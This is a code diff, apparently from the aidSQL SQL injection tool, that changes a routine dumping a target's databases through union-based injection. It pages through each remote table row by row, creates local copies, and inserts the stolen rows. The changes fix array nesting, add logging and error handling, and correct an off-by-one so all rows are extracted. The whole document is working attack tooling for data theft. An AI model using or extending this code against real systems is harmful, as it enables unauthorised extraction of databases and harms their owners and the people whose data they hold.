@@ -104,7 +104,7 @@
 						$tableAttributes	=	array();
 						$i						=	0;
 
-						$tablesArray	=	array();
+						$tablesArray		=	array();
 
 						while($table->attributes->item($i)){
 
@@ -118,7 +118,7 @@
 						$tableName	=	$tableAttributes["name"];
 						unset($tableAttributes["name"]);
 
-						$tablesArray[$tableName]["attributes"]	=	$tableAttributes;
+						$tablesArray["attributes"]	=	$tableAttributes;
 
 						$columns			=	$table->childNodes;
 						$columnsArray	=	array();
@@ -133,13 +133,15 @@
 								$columnsArray[$colName][$colChild->nodeName]	=	$colChild->nodeValue;
 							}
 
-							$tablesArray[$tableName]["columns"]	=	$columnsArray;
+							$tablesArray["columns"]	=	$columnsArray;
 
 						}
 
+						$schemasArray[$schemaName][$tableName]	=	$tablesArray;
+
 					}
 
-					$schemasArray[$schemaName]	=	$tablesArray;
+					
 
 				}
 
@@ -161,43 +163,62 @@
 				$plugin->injectionUnionWithConcat();
 
 				foreach($schemas as $schemaName=>$schemaTables){
-					
-					$this->createDatabase($mysqli,"aidSQL_".$schemaName);
+
+					$this->log("Creating database schema $schemaName",0,"light_green");
+
+					if(!$this->createDatabase($mysqli,"aidSQL_".$schemaName)){
+						throw(new \Exception("Couldnt create database aidSQL_$schemaName"));
+					}
+
 					$mysqli->select_db("aidSQL_".$schemaName);
 
 					foreach($schemaTables as $schemaTableName=>$schemaTableValues){
 
 						if($this->createTable($mysqli,$schemaTableName,$schemaTableValues)!==TRUE){
-							die("NO");
+							throw(new \Exception("Couldnt create table $schemaTableName"));
 						}
 
 						$attributes			=	$schemaTableValues["attributes"];
 						$columns				=	array_keys($schemaTableValues["columns"]);
+
 						$select				=	implode(',0x7c,',$columns);
 						$from					=	$schemaName.'.'.$schemaTableName;
 
 						$count				=	$plugin->count($columns[0],$from);
 						$count				=	$count[0] - 1;
-
+						
 						if($count==-1){
 
 							$this->log("No registers found on this table",0,"yellow");
 							continue;
 
+						}else{
+
+							$this->log("FOUND $count registers in table $schemaTableName",0,"light_cyan");
+
 						}
 
-						for($i=0;$i<$count;$i++){
+						$parameters	=	$plugin->getInjectionParameters();
 
-							$parameters	=	$plugin->getInjectionParameters();
+						for($i=0;$i<=$count;$i++){
+
 							$parameters["limit"]	=	array($i,1);
+
 							$plugin->setInjectionParameters($parameters);
+
 							$values	=	$plugin->unionQuery($select,$from,array(),array());
 							$values	=	$values[0];
 							
 							$values	=	explode('|',$values);
-							$this->insertRegisters($mysqli,$schemaTableName,$columns,$values);
+
+							if(!$this->insertRegisters($mysqli,$schemaTableName,$columns,$values)){
+								throw(new \Exception("Couldnt insert registers on $schemaTableName table!"));
+							}
 
 						}
+
+						$parameters["limit"]	=	array();
+						$plugin->setInjectionParameters($parameters);
 
 					}
 
@@ -210,7 +231,7 @@
 				$sql	=	"DROP DATABASE IF EXISTS $schemaName";
 				$sqli->query($sql);
 				$sql	=	"CREATE DATABASE $schemaName";
-				$sqli->query($sql);
+				return $sqli->query($sql);
 
 			}
 
@@ -225,7 +246,7 @@
 
 				}
 				$sql.=implode(',',$columns).')';
-				echo $sql."\n";
+
 				return $sqli->query($sql);
 
 			}
